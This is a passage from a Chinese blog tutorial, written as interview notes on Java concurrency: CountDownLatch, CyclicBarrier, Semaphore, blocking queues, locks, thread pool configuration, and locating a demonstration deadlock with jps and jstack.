能保证读写、写读和写写的过程是互斥的时候是独享的，读读的时候是共享的。 CountDownLatch、CyclicBarrier 和Semaphore 使用过吗？1、CountDownLatch 让一些线程堵塞直到另一个线程完成一系列操作后才被唤醒。CountDownLatch 主要有两个方法，当一个或多个线程调用 await 方法时，调用线程会被堵塞，其他线程调用 countDown 方法会将计数减一（调用 countDown 方法的线程不会堵塞），当计数其值变为零时，因调用 await 方法被堵塞的线程会被唤醒，继续执行。 假设我们有这么一个场景，教室里有班长和其他6个人在教室上自习，怎么保证班长等其他6个人都走出教室在把教室门给关掉。 public class CountDownLanchDemo { public static void main(String[] args) { for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 离开了教室...&quot;); }, String.valueOf(i)).start(); } System.out.println(&quot;班长把门给关了，离开了教室...&quot;); }} 此时输出 0 离开了教室...1 离开了教室...2 离开了教室...3 离开了教室...班长把门给关了，离开了教室...5 离开了教室...4 离开了教室... 发现班长都没有等其他人理他教室就把门给关了，此时我们就可以使用 CountDownLatch 来控制 public class CountDownLanchDemo { public static void main(String[] args) throws InterruptedException { CountDownLatch countDownLatch = new CountDownLatch(6); for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { countDownLatch.countDown(); System.out.println(Thread.currentThread().getName() + &quot; 离开了教室...&quot;); }, String.valueOf(i)).start(); } countDownLatch.await(); System.out.println(&quot;班长把门给关了，离开了教室...&quot;); }} 此时输出 0 离开了教室...1 离开了教室...2 离开了教室...3 离开了教室...4 离开了教室...5 离开了教室...班长把门给关了，离开了教室... 2、CyclicBarrier 我们假设有这么一个场景，每辆车只能坐个人，当车满了，就发车。 public class CyclicBarrierDemo { public static void main(String[] args) { CyclicBarrier cyclicBarrier = new CyclicBarrier(4, () -&gt; { System.out.println(&quot;车满了，开始出发...&quot;); }); for (int i = 0; i &lt; 8; i++) { new Thread(() -&gt; { System.out.println(Thread.currentThread().getName() + &quot; 开始上车...&quot;); try { cyclicBarrier.await(); } catch (InterruptedException e) { e.printStackTrace(); } catch (BrokenBarrierException e) { e.printStackTrace(); } }).start(); } }} 输出结果 Thread-0 开始上车...Thread-1 开始上车...Thread-3 开始上车...Thread-4 开始上车...车满了，开始出发...Thread-5 开始上车...Thread-7 开始上车...Thread-2 开始上车...Thread-6 开始上车...车满了，开始出发... 3、Semaphore 假设我们有 3 个停车位，6 辆车去抢 public class SemaphoreDemo { public static void main(String[] args) { Semaphore semaphore = new Semaphore(3); for (int i = 0; i &lt; 6; i++) { new Thread(() -&gt; { try { semaphore.acquire(); // 获取一个许可 System.out.println(Thread.currentThread().getName() + &quot; 抢到车位...&quot;); Thread.sleep(3000); System.out.println(Thread.currentThread().getName() + &quot; 离开车位&quot;); } catch (InterruptedException e) { e.printStackTrace(); } finally { semaphore.release(); // 释放一个许可 } }).start(); } }} 输出 Thread-1 抢到车位...Thread-2 抢到车位...Thread-0 抢到车位...Thread-2 离开车位Thread-0 离开车位Thread-3 抢到车位...Thread-1 离开车位Thread-4 抢到车位...Thread-5 抢到车位...Thread-3 离开车位Thread-5 离开车位Thread-4 离开车位 堵塞队列你知道吗？1、阻塞队列有哪些 ArrayBlockingQueue：是一个基于数组结构的有界阻塞队列，此队列按 FIFO（先进先出）对元素进行排序。 LinkedBlokcingQueue：是一个基于链表结构的阻塞队列，此队列按 FIFO（先进先出）对元素进行排序，吞吐量通常要高于 ArrayBlockingQueue。 SynchronousQueue：是一个不存储元素的阻塞队列，每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于 LinkedBlokcingQueue。 2、什么是阻塞队列 阻塞队列，顾名思义，首先它是一个队列，而一个阻塞队列在数据结构中所起的作用大致如图所示： 当阻塞队列是空时，从队列中获取元素的操作将会被阻塞。 当阻塞队列是满时，往队列里添加元素的操作将会被阻塞。 核心方法 方法\\行为 抛异常 特定的值 阻塞 超时 插入方法 add(o) offer(o) put(o) offer(o, timeout, timeunit) 移除方法 poll()、remove(o) take() poll(timeout, timeunit) 检查方法 element() peek() 行为解释： 抛异常：如果操作不能马上进行，则抛出异常 特定的值：如果操作不能马上进行，将会返回一个特殊的值，一般是 true 或者 false 阻塞：如果操作不能马上进行，操作会被阻塞 超时：如果操作不能马上进行，操作会被阻塞指定的时间，如果指定时间没执行，则返回一个特殊值，一般是 true 或者 false 插入方法： add(E e)：添加成功返回true，失败抛 IllegalStateException 异常 offer(E e)：成功返回 true，如果此队列已满，则返回 false put(E e)：将元素插入此队列的尾部，如果该队列已满，则一直阻塞 删除方法： remove(Object o) ：移除指定元素,成功返回true，失败返回false poll()：获取并移除此队列的头元素，若队列为空，则返回 null take()：获取并移除此队列头元素，若没有元素则一直阻塞 检查方法： element() ：获取但不移除此队列的头元素，没有元素则抛异常 peek() :获取但不移除此队列的头；若队列为空，则返回 null 3、SynchronousQueue SynchronousQueue，实际上它不是一个真正的队列，因为它不会为队列中元素维护存储空间。与其他队列不同的是，它维护一组线程，这些线程在等待着把元素加入或移出队列。 public class SynchronousQueueDemo { public static void main(String[] args) { SynchronousQueue&lt;Integer&gt; synchronousQueue = new SynchronousQueue&lt;&gt;(); new Thread(() -&gt; { try { synchronousQueue.put(1); Thread.sleep(3000); synchronousQueue.put(2); Thread.sleep(3000); synchronousQueue.put(3); } catch (InterruptedException e) { e.printStackTrace(); } }).start(); new Thread(() -&gt; { try { Integer val = synchronousQueue.take(); System.out.println(val); Integer val2 = synchronousQueue.take(); System.out.println(val2); Integer val3 = synchronousQueue.take(); System.out.println(val3); } catch (InterruptedException e) { e.printStackTrace(); } }).start(); }} 4、使用场景 生产者消费者模式 线程池 消息中间件 synchronized 和 Lock 有什么区别？ 原始结构 synchronized 是关键字属于 JVM 层面，反应在字节码上是 monitorenter 和 monitorexit，其底层是通过 monitor 对象来完成，其实 wait/notify 等方法也是依赖 monitor 对象只有在同步快或方法中才能调用 wait/notify 等方法。 Lock 是具体类（java.util.concurrent.locks.Lock）是 api 层面的锁。 使用方法 synchronized 不需要用户手动去释放锁，当 synchronized 代码执行完后系统会自动让线程释放对锁的占用。 ReentrantLock 则需要用户手动的释放锁，若没有主动释放锁，可能导致出现死锁的现象，lock() 和 unlock() 方法需要配合 try/finally 语句来完成。 等待是否可中断 synchronized 不可中断，除非抛出异常或者正常运行完成。 ReentrantLock 可中断，设置超时方法 tryLock(long timeout, TimeUnit unit)，lockInterruptibly() 放代码块中，调用 interrupt() 方法可中断。 加锁是否公平 synchronized 非公平锁 ReentrantLock 默认非公平锁，构造方法中可以传入 boolean 值，true 为公平锁，false 为非公平锁。 锁可以绑定多个 Condition synchronized 没有 Condition。 ReentrantLock 用来实现分组唤醒需要唤醒的线程们，可以精确唤醒，而不是像 synchronized 要么随机唤醒一个线程要么唤醒全部线程。 线程池使用过吗？谈谈对 ThreadPoolExector 的理解？为什使用线程池，线程池的优势？ 线程池用于多线程处理中，它可以根据系统的情况，可以有效控制线程执行的数量，优化运行效果。线程池做的工作主要是控制运行的线程的数量，处理过程中将任务放入队列，然后在线程创建后启动这些任务，如果线程数量超过了最大数量，那么超出数量的线程排队等候，等其它线程执行完毕，再从队列中取出任务来执行。 主要特点为： 线程复用 控制最大并发数量 管理线程 主要优点 降低资源消耗，通过重复利用已创建的线程来降低线程创建和销毁造成的消耗。 提高相应速度，当任务到达时，任务可以不需要的等到线程创建就能立即执行。 提高线程的可管理性，线程是稀缺资源，如果无限制的创建，不仅仅会消耗系统资源，还会降低体统的稳定性，使用线程可以进行统一分配，调优和监控。 创建线程的几种方式 继承 Thread 实现 Runnable 接口 实现 Callable public class CallableDemo { public static void main(String[] args) throws ExecutionException, InterruptedException { // 在 FutureTask 中传入 Callable 的实现类 FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;&gt;(new Callable&lt;Integer&gt;() { @Override public Integer call() throws Exception { return 666; } }); // 把 futureTask 放入线程中 new Thread(futureTask).start(); // 获取结果 Integer res = futureTask.get(); System.out.println(res); }} 线程池如果使用？ 架构说明 编码实现 Executors.newSingleThreadExecutor()：只有一个线程的线程池，因此所有提交的任务是顺序执行 Executors.newCachedThreadPool()：线程池里有很多线程需要同时执行，老的可用线程将被新的任务触发重新执行，如果线程超过60秒内没执行，那么将被终止并从池中删除 Executors.newFixedThreadPool()：拥有固定线程数的线程池，如果没有任务执行，那么线程会一直等待 Executors.newScheduledThreadPool()：用来调度即将执行的任务的线程池 Executors.newWorkStealingPool()： newWorkStealingPool适合使用在很耗时的操作，但是newWorkStealingPool不是ThreadPoolExecutor的扩展，它是新的线程池类ForkJoinPool的扩展，但是都是在统一的一个Executors类中实现，由于能够合理的使用CPU进行对任务操作（并行操作），所以适合使用在很耗时的任务中 ThreadPoolExecutor ThreadPoolExecutor作为java.util.concurrent包对外提供基础实现，以内部线程池的形式对外提供管理任务执行，线程调度，线程池管理等等服务。 线程池的几个重要参数介绍？ 参数 作用 corePoolSize 核心线程池大小 maximumPoolSize 最大线程池大小 keepAliveTime 线程池中超过 corePoolSize 数目的空闲线程最大存活时间；可以allowCoreThreadTimeOut(true) 使得核心线程有效时间 TimeUnit keepAliveTime 时间单位 workQueue 阻塞任务队列 threadFactory 新建线程工厂 RejectedExecutionHandler 当提交任务数超过 maxmumPoolSize+workQueue 之和时，任务会交给RejectedExecutionHandler 来处理 说说线程池的底层工作原理？ 重点讲解： 其中比较容易让人误解的是：corePoolSize，maximumPoolSize，workQueue之间关系。 当线程池小于corePoolSize时，新提交任务将创建一个新线程执行任务，即使此时线程池中存在空闲线程。 当线程池达到corePoolSize时，新提交任务将被放入 workQueue 中，等待线程池中任务调度执行。 当workQueue已满，且 maximumPoolSize 大于 corePoolSize 时，新提交任务会创建新线程执行任务。 当提交任务数超过 maximumPoolSize 时，新提交任务由 RejectedExecutionHandler 处理。 当线程池中超过corePoolSize 线程，空闲时间达到 keepAliveTime 时，关闭空闲线程 。 当设置allowCoreThreadTimeOut(true) 时，线程池中 corePoolSize 线程空闲时间达到 keepAliveTime 也将关闭。 线程池用过吗？生产上你如何设置合理参数？线程池的拒绝策略你谈谈？ 是什么 等待队列已经满了，再也塞不下新的任务，同时线程池中的线程数达到了最大线程数，无法继续为新任务服务。 拒绝策略 AbortPolicy：处理程序遭到拒绝将抛出运行时 RejectedExecutionException CallerRunsPolicy：线程调用运行该任务的 execute 本身。此策略提供简单的反馈控制机制，能够减缓新任务的提交速度。 DiscardPolicy：不能执行的任务将被删除 DiscardOldestPolicy：如果执行程序尚未关闭，则位于工作队列头部的任务将被删除，然后重试执行程序（如果再次失败，则重复此过程） 你在工作中单一的、固定数的和可变的三种创建线程池的方法，你用哪个多，超级大坑？ 如果读者对Java中的阻塞队列有所了解的话，看到这里或许就能够明白原因了。 Java中的BlockingQueue主要有两种实现，分别是ArrayBlockingQueue 和 LinkedBlockingQueue。 ArrayBlockingQueue是一个用数组实现的有界阻塞队列，必须设置容量。 LinkedBlockingQueue是一个用链表实现的有界阻塞队列，容量可以选择进行设置，不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE。 这里的问题就出在：不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE。也就是说，如果我们不设置LinkedBlockingQueue的容量的话，其默认容量将会是Integer.MAX_VALUE。 而newFixedThreadPool中创建LinkedBlockingQueue时，并未指定容量。此时，LinkedBlockingQueue就是一个无边界队列，对于一个无边界队列来说，是可以不断的向队列中加入任务的，这种情况下就有可能因为任务过多而导致内存溢出问题。 上面提到的问题主要体现在newFixedThreadPool和newSingleThreadExecutor两个工厂方法上，并不是说newCachedThreadPool和newScheduledThreadPool这两个方法就安全了，这两种方式创建的最大线程数可能是Integer.MAX_VALUE，而创建这么多线程，必然就有可能导致OOM。 你在工作中是如何使用线程池的，是否自定义过线程池使用？ 自定义线程池 public class ThreadPoolExecutorDemo { public static void main(String[] args) { Executor executor = new ThreadPoolExecutor(2, 3, 1L, TimeUnit.SECONDS, new LinkedBlockingQueue&lt;&gt;(5), Executors.defaultThreadFactory(), new ThreadPoolExecutor.DiscardPolicy()); }} 合理配置线程池你是如果考虑的？ CPU 密集型 CPU 密集的意思是该任务需要大量的运算，而没有阻塞，CPU 一直全速运行。 CPU 密集型任务尽可能的少的线程数量，一般为 CPU 核数 + 1 个线程的线程池。 IO 密集型 由于 IO 密集型任务线程并不是一直在执行任务，可以多分配一点线程数，如 CPU * 2 。 也可以使用公式：CPU 核数 / (1 - 阻塞系数)；其中阻塞系数在 0.8 ～ 0.9 之间。 死锁编码以及定位分析产生死锁的原因 死锁是指两个或两个以上的进程在执行过程中，因争夺资源而造成的一种相互等待的现象，如果无外力的干涉那它们都将无法推进下去，如果系统的资源充足，进程的资源请求都能够得到满足，死锁出现的可能性就很低，否则就会因争夺有限的资源而陷入死锁。 代码 public class DeadLockDemo { public static void main(String[] args) { String lockA = &quot;lockA&quot;; String lockB = &quot;lockB&quot;; DeadLockDemo deadLockDemo = new DeadLockDemo(); Executor executor = Executors.newFixedThreadPool(2); executor.execute(() -&gt; deadLockDemo.method(lockA, lockB)); executor.execute(() -&gt; deadLockDemo.method(lockB, lockA)); } public void method(String lock1, String lock2) { synchronized (lock1) { System.out.println(Thread.currentThread().getName() + &quot;--获取到：&quot; + lock1 + &quot;; 尝试获取：&quot; + lock2); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } synchronized (lock2) { System.out.println(&quot;获取到两把锁!&quot;); } } }} 解决 jps -l 命令查定位进程号 28519 org.jetbrains.jps.cmdline.Launcher32376 com.intellij.idea.Main28521 com.cuzz.thread.DeadLockDemo27836 org.jetbrains.kotlin.daemon.KotlinCompileDaemon28591 sun.tools.jps.Jps jstack 28521 找到死锁查看 2019-05-07 00:04:15Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.191-b12 mixed mode):&quot;Attach Listener&quot; #13 daemon prio=9 os_prio=0 tid=0x00007f7acc001000 nid=0x702a waiting on condition [0x0000000000000000] java.lang.Thread.State: RUNNABLE// ...Found one Java-level deadlock:=============================&quot;pool-1-thread-2&quot;: waiting to lock monitor 0x00007f7ad4006478 (object 0x00000000d71f60b0, a java.lang.String), which is held by &quot;pool-1-thread-1&quot;&quot;pool-1-thread-1&quot;: waiting to lock monitor 0x00007f7ad4003be8 (object 0x00000000d71f60e8, a java.lang.String), which is held by &quot;pool-1-thread-2&quot;Java stack information for the threads listed above:===================================================&quot;pool-1-thread-2&quot;: at com.cuzz.thread.DeadLockDemo.method(DeadLockDemo.java:34) - waiting to lock &lt;0x00000000d71f60b0&gt; (a java.lang.String) - locked &lt;0x00000000d71f60e8&gt; (a java.lang.String) at com.cuzz.thread.DeadLockDemo.lambda$main$1(DeadLockDemo.java:21) at com.cuzz.thread.DeadLockDemo$$Lambda$2/2074407503.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)&quot;pool-1-thread-1&quot;: at com.cuzz.thread.DeadLockDemo.method(DeadLockDemo.java:34) - waiting to lock &lt;0x00000000d71f60e8&gt; (a java.lang.String) - locked &lt;0x00000000d71f60b0&gt; (a java.lang.String) at com.cuzz.thread.DeadLockDemo.lambda$main$0(DeadLockDemo.java:20) at com.cuzz.thread.DeadLockDemo$$Lambda$1/558638686.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)Found 1 deadlock. 最后发现一个死锁。 后续JVM 面试 参考链接 Java内存模型-volatile","link":"/2019/04/16/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"cache","slug":"cache","link":"/tags/cache/"},{"name":"二进制","slug":"二进制","link":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"计算机基础","slug":"计算机基础","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"},{"name":"位运算","slug":"位运算","link":"/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"PostgreSQL","slug":"PostgreSQL","link":"/tags/PostgreSQL/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"反射","slug":"反射","link":"/tags/%E5%8F%8D%E5%B0%84/"},{"name":"UML","slug":"UML","link":"/tags/UML/"},{"name":"Full-Text Search","slug":"Full-Text-Search","link":"/tags/Full-Text-Search/"},{"name":"转载","slug":"转载","link":"/tags/%E8%BD%AC%E8%BD%BD/"},{"name":"英文","slug":"英文","link":"/tags/%E8%8B%B1%E6%96%87/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"Go","slug":"Go","link":"/tags/Go/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"Java8","slug":"Java8","link":"/tags/Java8/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"锁","slug":"锁","link":"/tags/%E9%94%81/"},{"name":"源码","slug":"源码","link":"/tags/%E6%BA%90%E7%A0%81/"},{"name":"Future","slug":"Future","link":"/tags/Future/"},{"name":"SPI","slug":"SPI","link":"/tags/SPI/"},{"name":"并发编程","slug":"并发编程","link":"/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"CSAPP","slug":"CSAPP","link":"/categories/CSAPP/"},{"name":"Go","slug":"Go","link":"/categories/Go/"},{"name":"Java 基础","slug":"Java-基础","link":"/categories/Java-%E5%9F%BA%E7%A1%80/"},{"name":"工具","slug":"工具","link":"/categories/%E5%B7%A5%E5%85%B7/"},{"name":"面试","slug":"面试","link":"/categories/%E9%9D%A2%E8%AF%95/"},{"name":"Netty","slug":"Netty","link":"/categories/Netty/"},{"name":"Dubbo","slug":"Dubbo","link":"/categories/Dubbo/"}]}